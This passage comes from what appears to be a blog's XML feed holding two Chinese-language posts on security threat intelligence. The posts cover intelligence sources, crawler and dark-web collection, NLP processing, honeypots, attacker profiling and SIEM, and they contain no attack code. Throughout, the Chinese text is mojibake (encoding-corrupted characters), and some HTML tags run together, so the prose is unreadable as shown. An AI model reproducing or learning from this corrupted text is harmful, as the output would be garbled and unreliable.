id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</h2><p>å°±æ˜¯æŒ‰ç…§æƒ…æŠ¥æ¥æºçš„åˆ†ç±»å»æ”¶é›†ï¼Œè€Œæ”¶é›†çš„æ–¹æ³•ï¼šå¯¹äºèµ„äº§æƒ…æŠ¥ç›´æ¥å»æ”¶é›†å°±å¥½ã€‚</p><p>å¯¹äºå…¶ä»–çš„æƒ…æŠ¥ï¼Œä¸»è¦ä¾èµ–ç½‘ç»œçˆ¬è™«å’Œå…¬å¼€çš„ API è¿›è¡Œæ”¶é›†</p><p>é€šè¿‡çˆ¬è™«æ”¶é›†åˆ†ä¸ºä¸¤ç§ï¼š</p><p>ç¬¬ä¸€ç§æ˜¯å…¬å¼€ä¿¡æ¯æ”¶é›†</p><p>å³å¯ä»¥é€šè¿‡ç±»ä¼¼äº selenium+scrapyè¿™ç§ç»„åˆå¯¹ç‰¹å®šé¡µé¢çš„æ•°æ®è¿›è¡Œçˆ¬å–è½åº“æ“ä½œ</p><p>Google å¼€æ”¾æœåŠ¡é‡Œé¢æä¾›ä¸€ç§æœåŠ¡å«åš Google CSE(CustomSearchEngine)ï¼Œè¿™ä¸ªä¸œè¥¿å¯ä»¥åˆ©ç”¨ Googleçš„çˆ¬è™«å¯¹ç‰¹å®šçš„ç›®æ ‡å®Œæˆå®šåˆ¶åŒ–çš„æŸ¥æ‰¾å’Œæ’åºï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è‡ªå¸¦çš„ APIå°†æœç´¢ç»“æœä¿å­˜æˆ JSON æ ¼å¼ï¼Œä»¥ä¾¿å’Œå…¶ä»–çš„å¹³å°è¿›è¡Œè¡”æ¥ã€‚ç”¨æˆ·åªéœ€è¦å¯¹ CSEé‡Œé¢çš„è§„åˆ™è¿›è¡Œç¼–å†™å³å¯å®Œæˆè¿™ä¸€éƒ¨åˆ†çš„æ”¶é›†ï¼›</p><p>ç¬¬äºŒç§æ˜¯æœªå…¬å¼€ä¿¡æ¯æ”¶é›†</p><p>é™¤äº†äº’è”ç½‘ä¹‹å¤–ï¼Œä¸€äº›ä¸šåŠ¡ç›¸å…³çš„å®‰å…¨ä¿¡æ¯æ›´å¤šçš„å¯èƒ½ä¼šå‡ºç°åœ¨æš—ç½‘ï¼Œé»‘/ç°äº§ç¤¾ç¾¤ç¤¾åŒºè®ºå›ç­‰ã€‚</p><p>æš—ç½‘çš„è¯å¯ä»¥ä½¿ç”¨ OnionProxy+OnionScanè¿›è¡Œæ”¶é›†ï¼Œæ­¤å¤–æœ‰ä¸€äº›æš—ç½‘æœç´¢å¼•æ“ä¹Ÿæä¾›äº† APIï¼Œå¯ä»¥è¿›è¡Œå’Œæœé›†ã€‚</p><p>é‰´äºé»‘äº§äº¤æ˜“çš„æ¸ é“å¤šä¸º QQ ç¾¤å’Œå¾®ä¿¡ç¾¤ä»¥åŠTelegramï¼Œå¯¹äºè¿™ä¸€éƒ¨åˆ†éœ€è¦å»ä½¿ç”¨èŠå¤©æœºå™¨äººå¯¹ç‰¹å®šçš„å‡ ä¸ªé»‘äº§ç¾¤çš„èŠå¤©è®°å½•è¿›è¡Œçˆ¬å–ï¼Œgithubä¸Šæœ‰å¾ˆå¤šå…¬å¼€çš„æœºå™¨äºº codeï¼ˆæ³¨æ„æ³•å¾‹æ³•è§„é—®é¢˜ï¼‰</p><p>ç¬¬ä¸‰ç§æ˜¯åŸºäº RSSã€è®¢é˜…çš„ä¿¡æ¯</p><p>è¿™ç§çš„è¯ç”±äºæ ¼å¼å¾ˆè§„èŒƒï¼Œè§£æåç›´æ¥è½åº“å³å¯ï¼Œä¸éœ€è¦èŠ±è´¹å¤ªå¤šçš„ç²¾åŠ›ï¼Œæ¨èä½¿ç”¨rssparser è¿™ç§åº“å»è§£æ RSS çš„è®¢é˜…æºï¼Œæœ‰æ—¶å€™ä¼šæ”¶é›†åˆ°ä¸€äº›æœ‰ç”¨çš„ä¸œè¥¿ã€‚</p><h2 id="ä¿¡æ¯é¢„å¤„ç†">ä¿¡æ¯é¢„å¤„ç†</h2><p>ä¿¡æ¯é¢„å¤„ç†ä¸»è¦é€šè¿‡è‡ªåŠ¨åŒ–å¤„ç†å»é™¤ä¸€äº›æ˜æ˜¾è™šå‡æˆ–æ— ç”¨çš„ä¿¡æ¯ï¼Œå‡å°‘æœé›†æ”¶é›†çš„ä¿¡æ¯ã€‚</p><h2 id="ç²—å¤„ç†">ç²—å¤„ç†</h2><p>ç²—å¤„ç†å®é™…ä¸Šæ˜¯å¯¹çˆ¬å–å›æ¥çš„ä¿¡æ¯è¿›è¡Œæ ¼å¼åŒ–ï¼Œæ¯”å¦‚è¯´ç»Ÿä¸€æ ¼å¼åŒ–æˆ JSONæ ¼å¼æˆ–è€…æ˜¯ XML è¿™ç§å¯ä»¥è‡ªåŠ¨åŒ–å¤„ç†çš„æ•°æ®ç»“æ„ã€‚</p><p>ç²—å¤„ç†æœ‰æ—¶ä¹Ÿå¯ä»¥å’Œä¿¡æ¯é¢„å¤„ç†ä¸€èµ·ã€‚</p><h2 id="ç²¾ç»†åŠ å·¥">ç²¾ç»†åŠ å·¥</h2><p>ç²¾åŠ å·¥ä¸»è¦æ˜¯å¯¹æƒ…æŠ¥è¿›è¡Œæ›´æ·±å±‚æ¬¡çš„æ–‡æœ¬åˆ†æï¼Œå¯ä»¥åˆ©ç”¨è¯¸å¦‚ NLPæŠ€æœ¯ã€è¯é¢‘å’Œè¯æ€§åˆ†æã€ä¸Šä¸‹æ–‡ç†è§£çš„æ–¹æ³•å¯¹æƒ…æŠ¥ä¿¡æ¯è¿›è¡Œæå–ï¼Œæå–å‡ºæ¥çš„å…³é”®å­—åº”åŒ…å«è¯¥æƒ…æŠ¥æ‰€å½±å“çš„ä½œç”¨ç‚¹ã€ä½œç”¨èŒƒå›´ã€æ˜¯å¦å—åˆ°å½±å“ã€å½±å“ç¨‹åº¦ã€æ˜¯å¦éœ€è¦æ¨åŠ¨åº”æ€¥å“åº”æµç¨‹ã€‚è¿™ä¸€éƒ¨åˆ†æ•°æ®æ˜¯éœ€è¦æ ¼å¼åŒ–æˆç‰¹å®šæ ¼å¼çš„ï¼Œæ–¹ä¾¿ä¸ç³»ç»Ÿçš„å¯¹æ¥ï¼Œè¿™é‡Œæ¨èä½¿ç”¨python çš„ NLPIRã€NLTKã€Scikit-learnã€Gensim è¿™ç§ NLPçš„åº“å»å¤„ç†ï¼Œæ–¹ä¾¿ä¸”é«˜æ•ˆã€‚</p><h2 id="æƒ…æŠ¥çš„æŒ–æ˜">æƒ…æŠ¥çš„æŒ–æ˜</h2><p>è¿™é‡Œä¸»è¦æ¶‰åŠåˆ°ç¥ç»ç½‘ç»œã€å…³è”å­¦ä¹ ã€å®‰å…¨ä¸“å®¶åˆ†æã€å¯è§†åŒ–åˆ†æ</p><h3 id="å†…éƒ¨æƒ…æŠ¥">å†…éƒ¨æƒ…æŠ¥</h3><p>æˆ‘ä»¬æŒ–æ˜æƒ…æŠ¥ä¸ä¸€å®šéœ€è¦ä»å¤–éƒ¨çš„æ•°æ®å»å…¥æ‰‹ï¼Œç›¸åå®é™…ä¸Šå†…éƒ¨çš„æ•°æ®å¾€å¾€æ˜¯æŒ–æ˜å¨èƒæƒ…æŠ¥çš„â€œé‡‘çŸ¿â€ã€‚æˆ‘ä»¬åœ¨å¯¹å¨èƒæƒ…æŠ¥æŒ–æ˜ä¹‹å‰éœ€è¦ç†æ¸…æ¥šä¸¤ä»¶äº‹æƒ…ï¼Œè¿™ä¸¤ä»¶äº‹æƒ…æ˜¯ï¼š</p><ul><li><p><em>ä»€ä¹ˆæ˜¯æ­£å¸¸çš„ä¸šåŠ¡æµç¨‹</em></p></li><li><p><em>ä¸šåŠ¡ä¼šé­å—ä½•ç§ç±»å‹çš„å¨èƒ</em></p></li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦é’ˆå¯¹æˆ‘ä»¬è®¾è®¡å¥½çš„åœºæ™¯å»è¿›è¡Œæ—¥å¿—å’Œæµé‡çš„æ¢³ç†ï¼Œæ—¥å¿—åˆ†æçš„ä¸»è¦æ˜¯ä¸šåŠ¡ç³»ç»Ÿæ—¥å¿—å’Œè®¿é—®æ—¥å¿—ï¼Œæµé‡åˆ™æ˜¯è¿›è¡Œé€šä¿¡çš„æµé‡DPI æ•°æ®ã€‚é€šè¿‡æŒç»­åŒ–è¿è¥ä¸€æ®µæ—¶é—´åï¼Œåœºæ™¯è¦†ç›–ç‡æå‡åˆ°ä¸€å®šç¨‹åº¦äº†</p><h3 id="å¤–éƒ¨æƒ…æŠ¥">å¤–éƒ¨æƒ…æŠ¥</h3><p>éƒ¨ç½²èœœç½ç³»ç»Ÿ</p><p>ä½ å¯ä»¥åœ¨å…¬ç½‘ä¸Šéƒ¨ç½²èœœç½ç³»ç»Ÿï¼Œå»å¯¹èœœç½çš„æ—¥å¿—è¿›è¡ŒæŒ–æ˜ï¼Œå½“ç„¶è¿™é‡Œä¸»è¦æ˜¯æ¶‰åŠåˆ°ä¸€äº›æ ·æœ¬å±‚é¢ä¸Šçš„ä¸œè¥¿ï¼Œå¦‚æœè¿æ°”å¥½çš„è¯ï¼Œä¹Ÿèƒ½å¤ŸæŒ–æ˜å‡ºæ¥ä¸€äº›æœ‰ç”¨çš„æ–°æ ·æœ¬æˆ–è€…æ˜¯c2ï¼Œå–å†³äºä½ æœ‰å¤šå°‘èœœç½çš„æ—¥å¿—å’Œèœœç½èŠ‚ç‚¹çš„åˆ†å¸ƒã€‚</p><p>é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“å¨èƒæƒ…æŠ¥æ˜¯æœ‰é’ˆå¯¹æ€§çš„ï¼Œå·®å¼‚åŒ–çš„ã€‚å¯¹ä¸åŒç±»å‹çš„ä¼ä¸š/ç³»ç»Ÿæ¥è¯´ï¼Œæœ‰çš„å¨èƒæƒ…æŠ¥ï¼Œå¯èƒ½å¯¹ä¼ä¸šA æ¥è¯´æ˜¯ä¸ºå¨èƒæƒ…æŠ¥ï¼Œä½†æ˜¯å¯¹ä¼ä¸š B æ¥è¯´ï¼Œå´æ²¡ä»€ä¹ˆã€‚</p><p>å‡è®¾æˆ‘ä»¬çš„ä¸šåŠ¡ç³»ç»Ÿå¾ˆå¤šéƒ½æ˜¯ web ç³»ç»Ÿï¼Œæ‰€ä»¥ accesslogæ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰ä»·å€¼çš„å…¥æ‰‹ç‚¹</p><h1 id="å¨èƒæƒ…æŠ¥çš„åˆ©ç”¨">å¨èƒæƒ…æŠ¥çš„åˆ©ç”¨</h1><p>å‚ç…§<ahref="https://xuj.me/threat_intelligence/sec-threat-intelli/#%E4%BC%81%E4%B8%9A%E5%B1%82%E9%9D%A2">ä¸ºä»€ä¹ˆéœ€è¦å¨èƒæƒ…æŠ¥çš„ä¼ä¸šå±‚é¢</a></p><h1 id="å¨èƒæƒ…æŠ¥çš„å…±äº«å’Œåº”ç”¨">å¨èƒæƒ…æŠ¥çš„å…±äº«å’Œåº”ç”¨</h1><p>å¨èƒæƒ…æŠ¥çš„æ•°æ®å¯ä»¥å…±äº«å‡ºæ¥ï¼Œå’Œä¸šå†…ä¸€èµ·é…åˆä½¿ç”¨ã€‚åœ¨ 360çš„å¨èƒæƒ…æŠ¥ä¸­å¿ƒä¸Šï¼Œä¸ç®¡æ˜¯å¨èƒåˆ¤å®šæ•°æ®ï¼Œè¿˜æ˜¯å…³è”æ•°æ®ã€æ ·æœ¬ç±»æ•°æ®ç­‰åŸºç¡€æ•°æ®éƒ½ä¼šæœ‰ã€‚</p><p>åœ¨å®¢æˆ·ç«¯æ•°æ®çš„å¹³å°ä¸Šï¼Œè¦èƒ½å¤ŸæŠŠå¨èƒæƒ…æŠ¥åŒå‘åº”ç”¨èµ·æ¥ï¼Œä¸ç®¡æ˜¯æ¨åŠ¨èµ·æ¥ï¼Œè¿˜æ˜¯åœ¨æŸ¥è¯¢å’Œæº¯æºä¸Šç»“åˆèµ·æ¥ã€‚æƒ…æŠ¥æ˜¯ä»æ•°æ®ä¸­æ¥ï¼Œæœ€åè¿˜è¦å›åˆ°æ•°æ®ä¸­å»ã€‚å¨èƒæƒ…æŠ¥åˆæ˜¯æœ€ç»ˆèƒ½å¤Ÿå›åˆ°å®¢æˆ·é‚£è¾¹æ‰èƒ½å‘æŒ¥å®ƒçš„ä½œç”¨ï¼Œä¸ç®¡æ˜¯å®‰å…¨å’Œå¨èƒçš„å‘ç°ä¸Šï¼Œè¿˜æ˜¯åœ¨è‡ªåŠ¨åŒ–çš„å“åº”è¿‡ç¨‹å½“ä¸­ï¼Œæˆ‘ä»¬éƒ½æŠŠå®ƒç»“åˆå¾—æ›´å¥½ã€‚</p><h1 id="å‚è€ƒæ¨è">å‚è€ƒæ¨è</h1><blockquote><ol type="1"><li><a href="https://www.aqniu.com/news-views/14658.html">CS3ï¼šå¨èƒæƒ…æŠ¥è§£å†³æ–¹æ¡ˆå³°ä¼šå…¨ç¨‹è®°å½•</a></li><li><ahref="https://www.freebuf.com/articles/network/201190.html">å¨èƒæƒ…æŠ¥çš„ç°åœ¨ä¸æœªæ¥ï¼šèµ‹èƒ½ã€æ·±å…¥ã€å…¨é¢åº”ç”¨</a></li><li><a href="https://www.aqniu.com/tools-tech/49931.html">ç”¨â€œå¤§æ•°æ®+AIâ€ï¼Œæ„å»ºå¨èƒæƒ…æŠ¥ç”Ÿæ€</a></li><li><ahref="https://zhuanlan.zhihu.com/p/38532724">æµ…è°ˆå¨èƒæƒ…æŠ¥ä»ç”²æ–¹è¿è¥åˆ°ä¹™æ–¹äº¤ä»˜</a></li><li><ahref="https://zhuanlan.zhihu.com/p/42903832">å¨èƒæƒ…æŠ¥é—­ç¯â€”â€”å¦‚ä½•å¾—åˆ°æœ‰ç”¨çš„æƒ…æŠ¥ç„¶åè¿½è¸ªæ”»å‡»è€…</a></li><li><ahref="http://blog.nsfocus.net/scenario-landing-practice-threat-intelligence/">å¨èƒæƒ…æŠ¥çš„è½åœ°å®è·µä¹‹åœºæ™¯ç¯‡</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> security miscellaneous </category>
          
      </categories>
      
      
        <tags>
            
            <tag> threat intelligence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰å…¨å¨èƒæƒ…æŠ¥</title>
      <link href="/blog/2019/09/08/misc/sec_threat_intelli/"/>
      <url>/blog/2019/09/08/misc/sec_threat_intelli/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦å‚è€ƒæ¼æ´é“¶è¡Œä¸¨å®‰å…¨å¨èƒæƒ…æŠ¥-g3onçš„åˆ†äº«ï¼Œæ„Ÿè°¢æ¼æ´é“¶è¡Œå¹³å°ä»¥åŠå¤§å’–çš„åˆ†äº«ã€‚</p><p>2018 å¹´ 10 æœˆ 10 å·æˆ‘å›½ç¬¬ä¸€éƒ¨å…³äºç½‘ç»œå®‰å…¨çš„æ ‡å‡†ï¼š<ahref="http://www.gb688.cn/bzgk/gb/newGbInfo?hcno=971636AF85AD7158EA50BB428F67C803"><code>ç½‘ç»œå®‰å…¨å¨èƒä¿¡æ¯æ ¼å¼è§„èŒƒ</code></a>æ­£å¼å‘å¸ƒ.</p><h1 id="å®‰å…¨å¨èƒæƒ…æŠ¥ç®€è¿°">å®‰å…¨å¨èƒæƒ…æŠ¥ç®€è¿°</h1><p>ä¸»è¦è®²è¿°å®‰å…¨æƒ…æŠ¥æ˜¯ä»€ä¹ˆã€‚</p><h2 id="æƒ…æŠ¥æŒ‰æ¥æºåˆ†ç±»">æƒ…æŠ¥æŒ‰æ¥æºåˆ†ç±»</h2><p>è¿™é‡Œæ˜¯å¯¹æƒ…æŠ¥æŒ‰ç…§ä¿¡æ¯çš„æ¥æºåˆ†ç±»ï¼ŒæŒ‰ç…§ä¿¡æ¯çš„æ¥æºåˆ†ç±»æ˜¯ä»æƒ…æŠ¥æ”¶é›†ä¹‹å‰ï¼ŒæŠ€æœ¯æ“ä½œå±‚é¢æ¥è®²çš„ã€‚</p><p>åé¢æˆ‘ä»¬ä¼šè®²åˆ°æŒ‰ç…§ä¿¡æ¯äº§ç”Ÿçš„æƒ…æŠ¥çš„ä¼˜å…ˆçº§/é‡è¦æ€§æ¥åˆ†ç±»ï¼Œé‚£æ—¶ä¾¿æ˜¯ä»åˆ†æå¾—åˆ°æƒ…æŠ¥ä¹‹åï¼ŒæŠ€æœ¯å±‚ã€ç®¡ç†å±‚æ‰€éœ€è¦åšçš„å“åº”æ¥è®²çš„ã€‚</p><p>ä¸»è¦æœ‰ï¼š<strong>èµ„äº§æƒ…æŠ¥</strong>ã€<strong>äº‹ä»¶æƒ…æŠ¥</strong>ã€<strong>æ¼æ´æƒ…æŠ¥</strong>ã€<strong>å¨èƒæƒ…æŠ¥</strong>å››ç§</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/sec_intellig_classifi.png" /></p><p><strong>èµ„äº§æƒ…æŠ¥</strong></p><p>å†…éƒ¨æƒ…æŠ¥ï¼ŒåŸºç¡€æ•°æ®æƒ…æŠ¥</p><p>ä¼ä¸šè‡ªèº«çš„æ•°æ® SOCï¼ŒSIEM æ•°æ®æ—¥å¿—ã€æ—¥å¿—ç®¡ç†å™¨ç­‰å¨èƒæ•°æ®</p><p>éå®‰å…¨è®¾å¤‡æ—¥å¿—ï¼šæ¯”å¦‚è¯´ç³»ç»Ÿè¿è¡Œçš„æ—¥å¿—ã€ç½‘ç»œè®¾å¤‡çš„æ—¥å¿—ã€VPN çš„æ—¥å¿—</p><p>å®‰å…¨è®¾å¤‡æ—¥å¿—ï¼šæ¯”å¦‚è¯´é˜²ç«å¢™ã€IDSã€WAF çš„æ—¥å¿—</p><p>ä¼ æ„Ÿå™¨æ—¥å¿—ï¼šç”¨æ¥äº‹å®æ¢æµ‹æƒ…å†µçš„æ—¥å¿—ï¼Œæ¯”å¦‚è¯´èœœç½çš„æ—¥å¿—ã€ç½‘ç»œä¼ æ„Ÿå™¨ç­‰ç­‰</p><p><strong>äº‹ä»¶æƒ…æŠ¥</strong></p><p>äº‹ä»¶æƒ…æŠ¥æ˜¯å¯¹å·²ç»å‘ç”Ÿçš„å®‰å…¨äº‹ä»¶çš„æŠ¥é“</p><p>WannaCry ç—…æ¯’ï¼Œxx ä½æˆ¿ä¿¡æ¯æ³„éœ²</p><p><strong>æ¼æ´æƒ…æŠ¥</strong></p><p>CVEã€Ndayã€è§£ææ¼æ´ç­‰å„ç§è½¯ç¡¬ä»¶çˆ†å‡ºæ¥çš„æ¼æ´</p><p><strong>å¨èƒæƒ…æŠ¥</strong></p><p>OSINTï¼Œå¯ä»¥å»ï¼šèšåˆåˆ†ææƒ…æŠ¥åœˆã€å¨èƒæƒ…æŠ¥å¹³å°ã€å…±äº«å¨èƒæƒ…æŠ¥ç­‰æ”¶é›†</p><p>æœªå…¬å¼€çš„æ•°æ®ï¼ˆæš—ç½‘ï¼Œé»‘äº§/ç°äº§çš„ç¤¾åŒº/ç¾¤/è®ºå›ã€é»‘å®¢é»‘äº§ç¤¾äº¤ç¤¾åŒºç­‰ï¼‰</p><h2 id="æ”»å‡»æºç”»åƒ">æ”»å‡»æºç”»åƒ</h2><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/sample_figure.png" /></p><p>ä½ ç»å¸¸åœ¨æŸå®ä¸Šæœç´¢æŸäº›å•†å“ï¼Œå¦‚ï¼šå…°è”»ï¼Œé¦™å¥ˆå„¿ï¼Œä½ ä¹Ÿæ€»æ˜¯åœ¨æŸå®ä¹°æµé‡ç­‰ã€‚æŸå®/æœç´¢å¼•æ“å¯¹ä½ åœ¨äº’è”ç½‘ä¸Šç•™ä¸‹çš„ç§ç§æ•°æ®è¿›è¡Œæ”¶é›†ã€åˆ†æï¼Œç„¶åç”Ÿæˆä¸€ä¸ªé’ˆå¯¹ä½ çš„ç”»åƒã€‚å®ƒä»¬åœ¨è¿™ä¸ªç”»åƒä¸Šè´´ä¸Šäº†ä¸€ç³»åˆ—çš„æ ‡ç­¾ï¼Œç„¶åæ ¹æ®è¿™ä¸ªç”»åƒå¯¹ä½ è¿›è¡Œç²¾å‡†çš„åˆ†æä»¥åŠè¥é”€ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/attacker_figure.png" /></p><p>æè¿°æ”»å‡»æºä»¥åŠæ”»å‡»åŸºç¡€è®¾æ–½ã€æŠ€æœ¯é£æ ¼ã€æƒ¯ç”¨æ‰‹æ³•ç­‰æ ‡è¯†</p><p>é€šè¿‡ä½ æ‰€æ”¶é›†åˆ°çš„ä¿¡æ¯ï¼Œä½ å¯ä»¥æ¨æµ‹ attackerçš„æ”»å‡»èƒ½åŠ›ã€æ”»å‡»æ¥æº/åœ°å€ï¼Œæ ¹æ®å®ƒæ”»å‡»çš„æ–¹å¼å¯ä»¥æ¨æµ‹å…¶æ”»å‡»ä¹ æƒ¯ã€‚</p><h2 id="å®‰å…¨å¨èƒæƒ…æŠ¥">å®‰å…¨å¨èƒæƒ…æŠ¥</h2><p>æœ‰äººè¯´å®‰å…¨å¨èƒæƒ…æŠ¥æ˜¯ï¼šç¤¾å·¥ä¿¡æ¯åº“çš„å¯¹æ’ã€æŠ“å–çš„æœ¨é©¬æ´»åŠ¨ï¼Œæœ‰äººè¯´æ˜¯ï¼šå°±æ˜¯åŠ n å¤šçš„ç¾¤ï¼štelegramã€qqã€wechatï¼Œè¿˜æœ‰ä¼ä¸šä¸€äº›ç›‘æ§ç³»ç»Ÿä¸Šçš„æ•°æ®ã€‚</p><p>SANSï¼š</p><p>é’ˆå¯¹å®‰å…¨å¨èƒã€å¨èƒè€…ã€åˆ©ç”¨ã€æ¶æ„è½¯ä»¶ã€æ¼æ´å’Œå±å®³æŒ‡æ ‡ã€æ‰€æ”¶é›†çš„ç”¨äºè¯„ä¼°çš„åº”ç”¨çš„æ•°æ®é›†</p><p>ISightï¼š</p><p>ç½‘ç»œå¨èƒæƒ…æŠ¥æ˜¯å…³äºå·²ç»æ”¶é›†ã€åˆ†æã€åˆ†å‘çš„ï¼Œé’ˆå¯¹æ”»å‡»è€…å’Œå…¶åŠ¨æœºçš„ç›®çš„æ‰‹æ®µï¼Œç”¨äºå¸®åŠ©æ‰€æœ‰å®‰å…¨çº§åˆ«çš„å’Œä¸šåŠ¡å‘˜å·¥ç”¨äºä¿æŠ¤å…¶ä¼ä¸šæ ¸å¿ƒèµ„äº§çš„çŸ¥è¯†</p><p>å¨èƒæ•°æ®--&gt;SIEMï¼ˆå®‰å…¨ä¿¡æ¯ä¸äº‹ä»¶ç®¡ç† security information and eventmanagementï¼‰--&gt;å®‰å…¨ä¿éšœ</p><p>ä»€ä¹ˆä½ ä¸çŸ¥é“ SIEM æ˜¯ä»€ä¹ˆï¼Œå—¯ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ emmï¼Œçœ‹çœ‹ä¸‹é¢é“¾æ¥ï¼š</p><p><a href="https://www.aqniu.com/learn/30040.html">SIEMæ˜¯ä»€ä¹ˆï¼Ÿå®ƒæ˜¯æ€ä¹ˆè¿ä½œçš„ï¼Ÿåˆè¯¥å¦‚ä½•é€‰æ‹©æ­£ç¡®çš„å·¥å…·ï¼Ÿ</a></p><p><a href="https://www.jianshu.com/p/f7330951e1ef">ä»€ä¹ˆæ˜¯SIEMï¼Ÿ</a></p><h2 id="å¸¸è§è¯¯åŒº">å¸¸è§è¯¯åŒº</h2><p><strong>æ¼æ´æƒ…æŠ¥å°±æ˜¯å¨èƒæƒ…æŠ¥ WRONG</strong></p><p>å¨èƒä¼ä¸šçš„ä¸åªåªæ¼æ´æƒ…æŠ¥ä¸€ä¸ªæ–¹é¢ï¼Œè¿˜æœ‰æ¯”å¦‚ï¼šé’“é±¼é‚®ä»¶ã€å‘˜å·¥çš„ä¸ªäººä¿¡æ¯ã€å¯†ç ä¹ æƒ¯ç­‰ã€‚</p><p>æ¼æ´æƒ…æŠ¥æ˜¯ä¸€ä¸ªçŸ¥å·±ï¼Œæ˜¯ä¸€ä¸ªäº†è§£å†…éƒ¨æƒ…å†µï¼Œæ’æŸ¥å†…éƒ¨é—®é¢˜çš„è¿‡ç¨‹</p><p>å¨èƒæƒ…æŠ¥æ˜¯çŸ¥å½¼ï¼Œä¸ºä¼ä¸šæä¾›å¯¹æ–¹å¯èƒ½çš„æ”»å‡»æ‰‹æ®µã€è§„æ¨¡çš„ï¼Œç”¨æ¥æå‰ä¸ºä¼ä¸šåšå¥½å¨èƒé˜²èŒƒã€‚</p><p>ä»å‰é¢çš„åˆ†ç±»æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼ŒäºŒè€…å±äºå¹³è¡Œå…³ç³»</p><p><strong>å¨èƒä¿¡æ¯=å¨èƒæƒ…æŠ¥ WRONG</strong></p><p>ç°åœ¨äº’è”ç½‘è¿™ä¹ˆå‘è¾¾ï¼Œæˆ‘ä»¬æ— è®ºæ˜¯ä» OSINTæŠ“å–ï¼Œæˆ–è€…ä»æš—ç½‘ä¸Šè·å–ä¿¡æ¯éƒ½æ˜¯å¾ˆç®€å•æ–¹ä¾¿çš„ï¼ˆæ³¨ï¼šæš—ç½‘çš„æœç´¢å¼•æ“æœ‰å¾ˆå¤šå“¦ï¼‰ï¼Œä½†æ˜¯å¨èƒæƒ…æŠ¥ä¸ä»…ä»…æ˜¯æ”¶é›†ä¿¡æ¯/æ•°æ®ï¼Œå®ƒæ˜¯ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ï¼šä¿¡æ¯çš„æ”¶é›†ã€å¤„ç†ã€åˆ†æã€‚è€Œå…¶æ ¸å¿ƒåˆ™åœ¨äºä¿¡æ¯åˆ†æã€‚å› ä¸ºä¿¡æ¯åˆ†æä¿è¯äº†æƒ…æŠ¥çš„ç²¾å‡†åº¦ï¼Œç›¸å…³æ€§ï¼Œæ—¶æ•ˆæ€§å’Œå®Œæ•´æ€§ã€‚</p><p>ä½ éœ€è¦ä¿¡æ¯æ¥äº§ç”Ÿæƒ…æŠ¥ï¼Œä½†æ˜¯ä¿¡æ¯å¹¶ä¸æ˜¯æƒ…æŠ¥ã€‚ä¿¡æ¯æœ‰æ—¶å€™ä¼šå°†ä¼ä¸šå®‰å…¨äººå‘˜æˆ–å†³ç­–å±‚æŒ‡å‘ä¸€ä¸ªé”™è¯¯çš„æ–¹å‘ï¼Œè€Œæƒ…æŠ¥æ˜¯ç»è¿‡å¤„ç†åˆ†æçš„ï¼Œå®ƒå¯ä»¥ååŠ©ä½ è§„åˆ’ï¼Œå¹¶ä¸”æä¾›ä¸€ä¸ªæ­£ç¡®çš„æ–¹å‘ã€‚å› æ­¤ï¼Œ<strong>å¨èƒä¿¡æ¯ä¸ç­‰åŒäºå¨èƒæƒ…æŠ¥ï¼Œå¨èƒä¿¡æ¯åªæ˜¯åŸææ–™ï¼ŒçœŸå‡å¥½åï¼Œéœ€è¦æˆ‘ä»¬è¿›è¡Œç²¾ç»†åŒ–åœ°å¤„ç†ã€åˆ†æï¼Œå»ä¼ªå­˜çœŸï¼Œæçº¯ç²¾ç‚¼ï¼Œä»è€Œå½¢æˆæˆå“ï¼Œä¹Ÿå°±æ˜¯å¨èƒæƒ…æŠ¥</strong></p><p><strong>å¨èƒæƒ…æŠ¥å°±æ˜¯ä¿¡æ¯æ”¶é›† WRONG</strong></p><p>ä¿¡æ¯æ”¶é›†åªæ˜¯ä½ æ„æˆå¨èƒæƒ…æŠ¥çš„ç¬¬ä¸€æ­¥ã€‚å½“æˆ‘ä»¬è·å–åˆ°åˆ†æå‡ºæ¥çš„çœŸæ­£çš„å¨èƒæƒ…æŠ¥æ—¶ï¼Œä¼ä¸šéœ€è¦æ ¹æ®å®ƒå»æ‰§è¡Œ/æ“ä½œã€‚å¦‚æœä¸€æ¡å¨èƒæƒ…æŠ¥æ²¡æœ‰å¯æ“ä½œæ€§çš„è¯ï¼Œé‚£ä¹ˆè¿™æ¡æƒ…æŠ¥å°±æ²¡ä»€ä¹ˆç”¨å¤„ï¼ˆè‡³å°‘åœ¨ç›®å‰æ˜¯æ²¡æœ‰ä»€ä¹ˆç”¨å¤„çš„ï¼‰ã€‚å› ä¸ºè¿™æ ·çš„æƒ…æŠ¥æ²¡æœ‰åŠæ³•ä¸ºä¼ä¸šå¸¦æ¥ä¸šåŠ¡åˆ©ç›Šï¼Œæ²¡æœ‰ä¸ºä¼ä¸šçš„SOCã€SIEM æä¾›ä¸€äº›æ¯”è¾ƒæœ‰åˆ©çš„å¸®åŠ©ã€‚</p><h1 id="å®‰å…¨å¨èƒæƒ…æŠ¥-ç°ä»Šå‘å±•">å®‰å…¨å¨èƒæƒ…æŠ¥-ç°ä»Šå‘å±•</h1><p>äº†è§£å½“ä¸‹çš„å®‰å…¨æƒ…æŠ¥æ”¶é›†å¹³å°ï¼Œè¿›ä¸€æ­¥äº†è§£å®‰å…¨å¨èƒæƒ…æŠ¥çš„åŸºç¡€ä»¥åŠæ ¸å¿ƒå†…å®¹</p><h2 id="é€æ¸å®Œå–„çš„æƒ…æŠ¥ä½“ç³»">é€æ¸å®Œå–„çš„æƒ…æŠ¥ä½“ç³»</h2><h3 id="è¡Œä¸šæ ‡å‡†">è¡Œä¸šæ ‡å‡†</h3><p>CybOXã€STIX å’Œ TAX ç­‰ ã€Šç½‘ç»œå®‰å…¨å¨èƒä¿¡æ¯æ ¼å¼è§„èŒƒã€‹</p><h4 